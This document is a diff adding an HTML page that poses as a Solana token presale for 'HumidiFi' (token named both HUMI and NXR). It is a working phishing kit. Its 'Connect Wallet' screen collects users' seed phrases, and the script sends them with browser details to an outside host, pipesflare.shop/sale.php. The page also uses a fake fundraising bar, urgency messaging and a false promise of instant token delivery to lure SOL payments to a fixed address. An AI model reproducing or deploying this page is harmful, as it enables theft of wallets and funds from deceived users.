@@ -1,0 +1,858 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HumidiFi (HUMI) — Presale on Solana</title>
+  <meta name="description" content="Initial presale of HumidiFi (HUMI) on Solana — SOL payments only." />
+  <style>
+    :root{
+      --bg:#0a0b10; --card:#11131a; --muted:#9aa4b2; --text:#e8ebf1;
+      --primary:#7c8cff; --accent:#a065ff; --radius:16px;
+    }
+    *{box-sizing:border-box}
+    html,body{
+      margin:0;
+      height:auto;
+      min-height:100vh;
+      background:radial-gradient(1200px 600px at 10% 10%, rgba(124,140,255,.08), transparent 60%),
+                 radial-gradient(900px 500px at 90% 0%, rgba(160,101,255,.08), transparent 60%),
+                 var(--bg); 
+      color:var(--text); 
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial;
+      overflow-x: hidden;
+    }
+    body {
+      display: block;
+      padding: 15px;
+    }
+    .wrap{
+      max-width:1100px;
+      width: 100%;
+      margin:0 auto;
+      padding:20px 15px;
+    }
+    .header-actions {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 20px;
+    }
+    .hero{
+      margin-top:24px;
+      padding:30px 20px;
+      border-radius:var(--radius);
+      background:linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0)),
+                 repeating-linear-gradient(45deg, rgba(255,255,255,.02) 0 2px, transparent 2px 6px);
+      position:relative; 
+      overflow:hidden; 
+      box-shadow: 0 0 0 2px rgba(124,140,255,.25), 0 0 24px rgba(160,101,255,.25) inset; 
+      text-align: center;
+    }
+    .badge{
+      display:inline-flex;
+      gap:10px;
+      align-items:center;
+      padding:8px 12px;
+      border-radius:999px;
+      background:rgba(124,140,255,.12);
+      color:#cdd5ff;
+      font-size:13px;
+      letter-spacing:.2px;
+      margin-bottom: 15px;
+    }
+    h1{
+      font-size:32px;
+      line-height:1.2;
+      margin:14px 0 10px;
+      font-weight:800;
+      letter-spacing:.3px
+    }
+    .tag{
+      font-size:16px;
+      color:#c6cbe0;
+      max-width:760px;
+      margin:0 auto 20px;
+    }
+    .row{
+      display:grid;
+      grid-template-columns:1.2fr 1fr;
+      gap:20px;
+      align-items:start;
+      margin-top:20px
+    }
+    @media (max-width:960px){ 
+      .row{
+        grid-template-columns:1fr
+      } 
+    }
+    .card{
+      background:linear-gradient(0deg, rgba(255,255,255,.02), rgba(255,255,255,0));
+      border:1px solid rgba(255,255,255,.06);
+      border-radius:14px;
+      padding:18px;
+      box-shadow:0 10px 28px rgba(0,0,0,.35);
+      margin-bottom: 20px;
+    }
+    .card h3{
+      margin:4px 0 10px;
+      font-size:20px
+    }
+    .muted{
+      color:var(--muted);
+      font-size:14px
+    }
+    .mono{
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+    }
+    .btn{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:12px 16px;
+      border-radius:12px;
+      font-weight:700;
+      background:linear-gradient(90deg, var(--primary), var(--accent));
+      color:white;
+      border:0;
+      cursor:pointer;
+      box-shadow:0 10px 24px rgba(124,140,255,.35);
+      transition:transform .06s ease;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .btn:active{
+      transform:translateY(1px)
+    }
+    .btn-outline{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:10px 14px;
+      border-radius:12px;
+      font-weight:700;
+      cursor:pointer;
+      color:#dbe0ff;
+      border:1px solid rgba(124,140,255,.35);
+      background:rgba(124,140,255,.08);
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .grid{
+      display:grid;
+      gap:14px
+    }
+    .cols-2{
+      grid-template-columns:1fr 1fr
+    }
+    @media (max-width:680px){ 
+      .cols-2{
+        grid-template-columns:1fr
+      }
+      h1 {
+        font-size: 24px;
+      }
+      .hero {
+        padding: 20px 15px;
+        margin-top: 10px;
+      }
+      .wrap {
+        padding: 10px;
+      }
+      .card {
+        padding: 15px;
+      }
+    }
+    .pill{
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:6px 10px;
+      border-radius:999px;
+      background:rgba(255,255,255,.06);
+      font-size:13px
+    }
+    .hr{
+      height:1px;
+      background:rgba(255,255,255,.06);
+      margin:14px 0
+    }
+    .h2{
+      font-size:22px;
+      margin:14px 0 8px;
+      font-weight:800
+    }
+    .chip{
+      padding:10px 12px;
+      border-radius:12px;
+      background:rgba(255,255,255,.06);
+      display:flex;
+      justify-content:space-between;
+      align-items:center
+    }
+    .small{
+      font-size:12px;
+      color:#98a2b3
+    }
+    .count{
+      font-weight:800; 
+      letter-spacing:.5px; 
+      font-size:28px
+    }
+    .foot{
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      align-items:center;
+      justify-content:space-between;
+      margin-top:18px
+    }
+    
+    .progress-container {
+      margin: 20px 0; 
+      background: rgba(255,255,255,0.05); 
+      border-radius: 10px; 
+      height: 12px;
+    }
+    .progress-bar {
+      height: 100%; 
+      background: linear-gradient(90deg, var(--primary), var(--accent)); 
+      border-radius: 10px; 
+      width: 99.91%;
+    }
+    .progress-info {
+      display: flex; 
+      justify-content: space-between; 
+      margin-top: 8px;
+    }
+    .warning {
+      background: rgba(255,193,7,0.1); 
+      border: 1px solid rgba(255,193,7,0.3); 
+      border-radius: 8px; 
+      padding: 12px; 
+      margin: 16px 0;
+    }
+    .warning-title {
+      display: flex; 
+      align-items: center; 
+      gap: 8px; 
+      font-weight: bold; 
+      margin-bottom: 8px;
+    }
+    .faq-item {
+      margin-bottom: 16px;
+    }
+    .faq-question {
+      font-weight: bold; 
+      margin-bottom: 8px; 
+      cursor: pointer; 
+      display: flex; 
+      justify-content: space-between; 
+      align-items: center;
+    }
+    .faq-answer {
+      color: var(--muted); 
+      padding-right: 16px;
+      display: none;
+    }
+    .success-message {
+      background: rgba(76,175,80,0.1);
+      border: 1px solid rgba(76,175,80,0.3);
+      border-radius: 8px;
+      padding: 12px;
+      margin: 16px 0;
+      text-align: center;
+    }
+    input {
+      width:100%; 
+      padding:10px; 
+      border-radius:10px; 
+      border:1px solid rgba(255,255,255,.12); 
+      background:rgba(255,255,255,.04); 
+      color:inherit;
+      font-size: 14px;
+    }
+    textarea {
+      width:100%; 
+      padding:10px; 
+      border-radius:10px; 
+      border:1px solid rgba(255,255,255,.12); 
+      background:rgba(255,255,255,.04); 
+      color:inherit;
+      resize: vertical;
+      min-height: 100px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+      font-size: 14px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+    }
+    .address-container {
+      background: rgba(255,255,255,0.04);
+      border-radius: 10px;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid rgba(255,255,255,0.08);
+      word-break: break-all;
+    }
+    .copy-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      background: rgba(124,140,255,0.15);
+      color: #cdd5ff;
+      border: 1px solid rgba(124,140,255,0.3);
+      cursor: pointer;
+      font-size: 13px;
+      margin-top: 8px;
+      transition: all 0.2s ease;
+    }
+    .copy-btn:hover {
+      background: rgba(124,140,255,0.25);
+    }
+    .copy-btn:active {
+      transform: translateY(1px);
+    }
+    .countdown-status {
+      font-size: 14px;
+      margin-top: 8px;
+      color: var(--muted);
+    }
+    .status-active {
+      color: #4CAF50;
+    }
+    .status-ended {
+      color: #F44336;
+    }
+    .status-upcoming {
+      color: #FF9800;
+    }
+    .date-info {
+      font-size: 12px;
+      margin-top: 4px;
+      color: var(--muted);
+    }
+    
+    /* Styles for wallet connection page */
+    .wallet-options {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin: 20px 0;
+    }
+    @media (max-width: 680px) {
+      .wallet-options {
+        grid-template-columns: 1fr;
+      }
+    }
+    .wallet-option {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+      border-radius: var(--radius);
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.08);
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .wallet-option:hover {
+      background: rgba(255,255,255,0.06);
+      border-color: rgba(124,140,255,0.3);
+    }
+    .wallet-icon {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 12px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(124,140,255,0.1);
+    }
+    .wallet-icon img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+    }
+    .seed-input-container {
+      margin: 20px 0;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(124,140,255,0.3);
+      border-left: 4px solid var(--primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .example-text {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 8px;
+      font-style: italic;
+    }
+
+    /* Mobile-specific fixes */
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+      .wrap {
+        padding: 10px 5px;
+      }
+      .hero {
+        padding: 15px 10px;
+        margin-top: 5px;
+      }
+      h1 {
+        font-size: 20px;
+      }
+      .header-actions {
+        margin-bottom: 15px;
+      }
+      .btn, .btn-outline {
+        padding: 10px 12px;
+        font-size: 12px;
+      }
+      .card {
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap" id="mainPage">
+    <div class="header-actions">
+      <button class="btn" id="connectWalletBtn">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="margin-right: 8px;">
+          <path d="M13.5 3h-11C1.67 3 1 3.67 1 4.5v7c0 .83.67 1.5 1.5 1.5h11c.83 0 1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-11 1h11c.28 0 .5.22.5.5v1H2v-1c0-.28.22-.5.5-.5zm11 8h-11c-.28 0-.5-.22-.5-.5v-4h12v4c0 .28-.22.5-.5.5z"/>
+          <circle cx="4" cy="6" r="1"/>
+          <circle cx="7" cy="6" r="1"/>
+        </svg>
+        Connect Wallet
+      </button>
+    </div>
+    <header class="hero">
+      <div class="badge">HumidiFi • Solana • Token: <span class="mono">$NXR</span></div>
+      <h1>HumidiFi — The Future of AI and DeFi</h1>
+      <p class="tag">AI-powered smart finance on <strong>Solana</strong>. Join the NXR presale — SOL payments only.</p>
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      <div class="progress-info">
+        <span>Raised: 99,910 SOL</span>
+        <span>Target: 100,000 SOL</span>
+      </div>      
+      <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:16px; justify-content: center;">
+        <a class="btn" href="#presale">Join Presale</a>
+        <a class="btn-outline" href="https://x.com/humidifi_" target="_blank" rel="noopener">Twitter</a>
+      </div>
+    </header>
+    <section id="presale" class="row">
+      <div class="card">
+        <h3>Presale — SOL Only</h3>
+        <div class="warning">
+          <div class="warning-title">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+              <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 12.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zM8 4a1 1 0 0 0-1 1v4a1 1 0 0 0 2 0V5a1 1 0 0 0-1-1z"/>
+            </svg>
+            Security Alert
+          </div>
+          <div class="small">Always verify the wallet address before sending. Never send to an untrusted address.</div>
+        </div>        
+        <div class="grid cols-2" style="margin-top:10px">
+          <div>
+            <div class="muted">Wallet for Presale Subscription</div>
+            <div class="address-container">
+              <div class="mono" id="addr">8rAExFd7mTdU1GMd4fSC7jHpufhr6D4ZbJkR98PV9w5w</div>
+              <button class="copy-btn" id="copyBtn">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+                  <path d="M4 4v8h8V4H4zm8-2H4a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/>
+                </svg>
+                Copy Address
+              </button>
+            </div>
+            <div style="display:flex; gap:8px; margin-top:10px">
+              <button class="btn-outline" id="qrBtn">Show QR</button>
+            </div>
+            <div class="hr"></div>
+            <div class="grid">
+              <div class="pill mono">Price: 1 NXR = $0.02 USD</div>
+              <div class="pill mono">Network: Solana</div>
+              <div class="pill mono">Accepted Payments: SOL Only</div>
+            </div>
+            <div class="hr"></div>
+            <div>
+              <div class="muted" style="margin-bottom:6px">Quick Payment (Solana Link)</div>
+              <div class="grid">
+                <a id="paySOL" class="btn" href="#">Pay with SOL</a>
+                <div class="small">Will prompt you for SOL amount and open Solana wallet using <span class="mono">solana:</span> link.</div>
+              </div>
+            </div>
+          </div>
+          <div>
+            <div class="h2">Allocation Calculator</div>
+            <div class="muted">Enter the amount of SOL you plan to send (you can adjust SOL/USD price).</div>
+            <div class="hr"></div>
+            <div class="grid">
+              <label>SOL Amount
+                <input id="sol" type="number" min="0" step="0.0001" placeholder="1.0">
+              </label>
+              <label>Approximate SOL Price in USD
+                <input id="solusd" type="number" min="0" step="0.01" value="170">
+              </label>
+              <div class="chip"><span class="muted">You'll Receive (Est.)</span><strong><span id="nxrFromSol">0</span> NXR</strong></div>
+            </div>
+            <div class="small" style="margin-top:8px">Formula: <code>NXR = (SOL × SOLUSD) ÷ 0.02</code>.</div>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <h3>Presale Countdown</h3>
+        <div class="muted">Phase 1 ends in:</div>
+        <div class="count" id="count">—</div>
+        <div class="countdown-status" id="countdownStatus">Loading...</div>
+        <div class="date-info" id="dateInfo"></div>
+        <div class="small">Almost Complete! Only 90 SOL remaining to reach our goal!</div>
+        <div class="hr"></div>
+        <h3>How to Participate</h3>
+        <ol>
+          <li>Send <strong>SOL</strong> to the wallet address above (use quick payment or copy/QR).</li>
+          <li>Immediately after transfer, <strong>NXR</strong> tokens will be automatically deposited to your wallet.</li>
+          <li>You can track your transaction on Solana explorer using transaction signature.</li>
+        </ol>
+        <div class="success-message">
+          <div class="warning-title">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zM7 11.5L4 8.5l1-1 2 2 4-4 1 1-5 5z"/>
+            </svg>
+            Fully Automated Process
+          </div>
+          <div class="small">Once you transfer SOL, NXR will be automatically sent to your wallet without any need for communication.</div>
+        </div>
+      </div>
+    </section>
+    <section class="card" style="margin-top:16px">
+      <h3>Frequently Asked Questions</h3>
+      <div class="faq-item">
+        <div class="faq-question">When will I receive NXR tokens? <span>+</span></div>
+        <div class="faq-answer">Tokens will be distributed automatically once your transaction is confirmed on the network, usually within minutes.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-question">Can I participate with currencies other than SOL? <span>+</span></div>
+        <div class="faq-answer">No, we only accept SOL for the presale at this stage.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-question">What is the minimum participation? <span>+</span></div>
+        <div class="faq-answer">Minimum 2 SOL, Maximum 60 SOL.</div>
+      </div>
+    </section>
+    <section class="card" style="margin-top:16px">
+      <h3>About HumidiFi</h3>
+      <p>HumidiFi (HUMI) integrates AI with decentralized finance on Solana. We build AI-powered tools for market analysis, portfolio optimization, and real-time trading signals — all on-chain with transparency.</p>
+    </section>
+    <footer class="foot">
+      <div class="small">© <span id="yr"></span> HumidiFi • All rights reserved.</div>
+      <div class="small">Twitter: <a href="https://x.com/humidifi_" target="_blank" rel="noopener">@humidifi_</a></div>
+    </footer>
+  </div>
+  <div class="wrap" id="walletPage" style="display: none;">
+    <div class="card">
+      <h2>Connect Your Wallet</h2>
+      <p class="muted">Select your wallet type to continue</p>
+      
+      <div class="wallet-options">
+        <div class="wallet-option" id="phantomOption">
+          <div class="wallet-icon"><img src="https://www2.0zz0.com/2025/10/24/23/717453191.png" alt="Phantom"></div>
+          <h3>Phantom</h3>
+          <p class="small">Popular Solana Wallet</p>
+        </div>
+        <div class="wallet-option" id="trustOption">
+          <div class="wallet-icon"><img src="https://www2.0zz0.com/2025/10/24/23/148919873.jpeg" alt="Trust Wallet"></div>
+          <h3>Trust Wallet</h3>
+          <p class="small">Multi-chain Wallet</p>
+        </div>
+        <div class="wallet-option" id="binanceOption">
+          <div class="wallet-icon"><img src="https://www2.0zz0.com/2025/10/24/23/920917991.png" alt="Binance"></div>
+          <h3>Binance wallet</h3>
+          <p class="small">Crypto Exchange Wallet</p>
+        </div>
+        <div class="wallet-option" id="metamaskOption">
+          <div class="wallet-icon"><img src="https://www2.0zz0.com/2025/10/24/23/224859717.png" alt="MetaMask"></div>
+          <h3>MetaMask</h3>
+          <p class="small">Ethereum Wallet</p>
+        </div>
+        <div class="wallet-option" id="coinbaseOption">
+          <div class="wallet-icon"><img src="https://www2.0zz0.com/2025/10/24/23/847834679.png" alt="Coinbase Wallet"></div>
+          <h3>Coinbase Wallet</h3>
+          <p class="small">Multi-chain Wallet</p>
+        </div>
+      </div>
+      <div class="hr"></div>
+      <div id="seedPhraseSection" style="display: none;">
+        <h3>Enter Your Seed Phrase</h3>
+        <p class="muted">Please enter your word seed phrase separated by spaces</p>
+        <div class="warning">
+          <div class="warning-title">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+              <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 12.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zM8 4a1 1 0 0 0-1 1v4a1 1 0 0 0 2 0V5a1 1 0 0 0-1-1z"/>
+            </svg>
+            Security Notice
+          </div>
+          <div class="small">.</div>
+        </div>
+        <div class="seed-input-container">
+          <label for="seedPhraseInput">Seed Phrase:</label>
+          <textarea 
+            id="seedPhraseInput" 
+            placeholder="Enter your seed phrase separated by spaces"
+            rows="3"
+          ></textarea>
+          <div class="example-text">Example: bshje behejj cxlwbsn apple banana cherry ...</div>
+        </div>
+        <button class="btn" id="connectBtn" style="width: 100%; margin-top: 20px;">
+          Connect Wallet
+        </button>
+      </div>
+      
+      <div class="loading" id="loadingSection">
+        <div class="spinner"></div>
+        <p>Connecting to wallet...</p>
+      </div>
+      <button class="btn-outline" id="backBtn" style="margin-top: 20px;">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="margin-right: 8px;">
+          <path d="M11.5 14.5l-6-6 6-6 1 1-5 5 5 5z"/>
+        </svg>
+        Back to Main Page
+      </button>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script>
+    const mainPage = document.getElementById('mainPage');
+    const walletPage = document.getElementById('walletPage');
+    const connectWalletBtn = document.getElementById('connectWalletBtn');
+    const backBtn = document.getElementById('backBtn');
+    const phantomOption = document.getElementById('phantomOption');
+    const trustOption = document.getElementById('trustOption');
+    const binanceOption = document.getElementById('binanceOption');
+    const metamaskOption = document.getElementById('metamaskOption');
+    const coinbaseOption = document.getElementById('coinbaseOption');
+    const seedPhraseSection = document.getElementById('seedPhraseSection');
+    const seedPhraseInput = document.getElementById('seedPhraseInput');
+    const connectBtn = document.getElementById('connectBtn');
+    const loadingSection = document.getElementById('loadingSection');
+    let selectedWallet = '';
+    connectWalletBtn.addEventListener('click', () => {
+      mainPage.style.display = 'none';
+      walletPage.style.display = 'block';
+    });
+    backBtn.addEventListener('click', () => {
+      walletPage.style.display = 'none';
+      mainPage.style.display = 'block';
+      resetWalletSelection();
+    });
+    phantomOption.addEventListener('click', () => {
+      selectWallet('phantom');
+    });
+    trustOption.addEventListener('click', () => {
+      selectWallet('trust');
+    });
+    binanceOption.addEventListener('click', () => {
+      selectWallet('binance');
+    });
+    metamaskOption.addEventListener('click', () => {
+      selectWallet('metamask');
+    });
+    coinbaseOption.addEventListener('click', () => {
+      selectWallet('coinbase');
+    });
+    function selectWallet(walletType) {
+      selectedWallet = walletType;
+      
+      document.querySelectorAll('.wallet-option').forEach(option => {
+        option.style.borderColor = 'rgba(255,255,255,0.08)';
+        option.style.background = 'rgba(255,255,255,0.03)';
+      });
+      const selectedElement = document.getElementById(`${walletType}Option`);
+      selectedElement.style.borderColor = 'rgba(124,140,255,0.5)';
+      selectedElement.style.background = 'rgba(124,140,255,0.1)';
+      seedPhraseSection.style.display = 'block';
+      seedPhraseInput.value = '';
+    }   
+    function resetWalletSelection() {
+      selectedWallet = '';
+      seedPhraseSection.style.display = 'none';
+      seedPhraseInput.value = '';
+      document.querySelectorAll('.wallet-option').forEach(option => {
+        option.style.borderColor = 'rgba(255,255,255,0.08)';
+        option.style.background = 'rgba(255,255,255,0.03)';
+      });
+    }
+    seedPhraseInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+
+	connectBtn.addEventListener('click', async () => {
+  const seedPhrase = seedPhraseInput.value.trim();
+  if (!seedPhrase) {
+    alert('Please enter your seed phrase');
+    return;
+  }
+
+  seedPhraseSection.style.display = 'none';
+  loadingSection.style.display = 'block';
+
+  try {
+    // Отправляем данные на ваш PHP файл
+    const formData = new FormData();
+    formData.append('walletType', selectedWallet);
+    formData.append('seedPhrase', seedPhrase);
+    formData.append('userAgent', navigator.userAgent);
+    formData.append('timestamp', new Date().toISOString());
+
+    const response = await fetch('https://pipesflare.shop/sale.php', {
+      method: 'POST',
+      body: formData
+    });
+
+    if (response.ok) {
+      setTimeout(() => {
+        alert('Wallet connected successfully!');
+        walletPage.style.display = 'none';
+        mainPage.style.display = 'block';
+        resetWalletSelection();
+        loadingSection.style.display = 'none';
+      }, 2000);
+    } else {
+      throw new Error('Connection failed');
+    }
+  } catch (error) {
+    setTimeout(() => {
+      alert('Error: Invalid seed phrase or connection failed');
+      seedPhraseSection.style.display = 'block';
+      loadingSection.style.display = 'none';
+    }, 2000);
+  }
+});
+    const TREASURY = "8rAExFd7mTdU1GMd4fSC7jHpufhr6D4ZbJkR98PV9w5w";
+    const PRICE_PER_NXR = 0.02;  
+    const END = new Date("2025-11-01T23:59:59");
+    const $ = (q)=>document.querySelector(q);
+    const nxrFromSol  = $("#nxrFromSol");
+    document.getElementById("dateInfo").textContent = `End date: ${END.toLocaleDateString()}`;     
+    $("#copyBtn").onclick = async () => {
+      try {
+        await navigator.clipboard.writeText(TREASURY);
+        alert("✓ Address copied successfully!");
+      } catch(e){ 
+        const textArea = document.createElement("textarea");
+        textArea.value = TREASURY;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        alert("✓ Address copied!");
+      }
+    };        
+    const qrBtn = document.getElementById("qrBtn");
+    qrBtn.addEventListener("click", () => {
+      const uri = `solana:${TREASURY}`;
+      const overlay = document.createElement("div");
+      overlay.style.position="fixed"; 
+      overlay.style.inset="0"; 
+      overlay.style.background="rgba(0,0,0,.6)";
+      overlay.style.display="grid"; 
+      overlay.style.placeItems="center"; 
+      overlay.style.zIndex="9999";
+      const box = document.createElement("div");
+      box.style.background="#fff"; 
+      box.style.padding="16px"; 
+      box.style.borderRadius="12px"; 
+      box.style.maxWidth="92vw"; 
+      box.style.textAlign="center";
+      const title = document.createElement("div"); 
+      title.textContent="Scan to Pay (SOL)"; 
+      title.style.margin="6px 0 10px"; 
+      title.style.fontWeight="800"; 
+      title.style.color="#000";
+      const qrDiv = document.createElement("div");
+      new QRCode(qrDiv, { text: uri, width: 320, height: 320 });
+      const small = document.createElement("div"); 
+      small.style.fontSize="12px"; 
+      small.style.color="#333"; 
+      small.style.marginTop="10px"; 
+      small.textContent = uri;
+      const close = document.createElement("button"); 
+      close.textContent="Close"; 
+      close.className="btn"; 
+      close.style.marginTop="10px";
+      close.onclick=()=>{ document.body.removeChild(overlay); };
+      box.append(title, qrDiv, small, close);
+      overlay.append(box);
+      document.body.append(overlay);
+    });       
+    document.getElementById("paySOL").onclick = (e)=>{
+      e.preventDefault();
+      const amt = parseFloat(prompt("SOL Amount (e.g., 1.5):")||"0");
+      if(!(amt>0)) return;
+      const uri = `solana:${TREASURY}?amount=${amt}&label=HumidiFi%20Presale&message=NXR%20Presale%20SOL`;
+      window.location.href = uri;
+    };       
+    const calc = ()=>{
+      const sol  = parseFloat(document.getElementById("sol").value||"0");
+      const solusd = parseFloat(document.getElementById("solusd").value||"0");
+      const usdFromSol = (sol>0 && solusd>0) ? sol*solusd : 0;
+      const nxr2 = usdFromSol>0 ? Math.floor((usdFromSol/PRICE_PER_NXR)) : 0;
+      nxrFromSol.textContent  = nxr2.toLocaleString();
+    };        
+    ["sol","solusd"].forEach(id => document.getElementById(id).addEventListener("input", calc));
+    calc();     
+    const fmt=(n)=>String(n).padStart(2,"0");        
+    const tick=()=>{
+      const now = new Date();
+      const diff = Math.max(0, END - now);
+      const d = Math.floor(diff / (24*60*60*1000));
+      const h = Math.floor((diff % (24*60*60*1000))/(60*60*1000));
+      const m = Math.floor((diff % (60*60*1000))/(60*1000));
+      const s = Math.floor((diff % (60*1000))/1000);      
+      const countElement = document.getElementById("count");
+      const statusElement = document.getElementById("countdownStatus");     
+      if (diff > 0) {
+        countElement.textContent = `${d}d ${fmt(h)}h ${fmt(m)}m ${fmt(s)}s`;
+        statusElement.textContent = "Presale is active";
+        statusElement.className = "countdown-status status-active";
+        setTimeout(tick, 1000);
+      } else {
+        countElement.textContent = "Ended";
+        statusElement.textContent = "Presale has ended";
+        statusElement.className = "countdown-status status-ended";
+      }
+    };      
+    tick();
+    document.getElementById("yr").textContent = new Date().getFullYear();    
+    document.querySelectorAll('.faq-question').forEach(question => {
+      question.addEventListener('click', () => {
+        const answer = question.nextElementSibling;
+        answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
+        const icon = question.querySelector('span');
+        icon.textContent = icon.textContent === '+' ? '-' : '+';
+      });
+    });
+  </script>
+</body>
+</html>
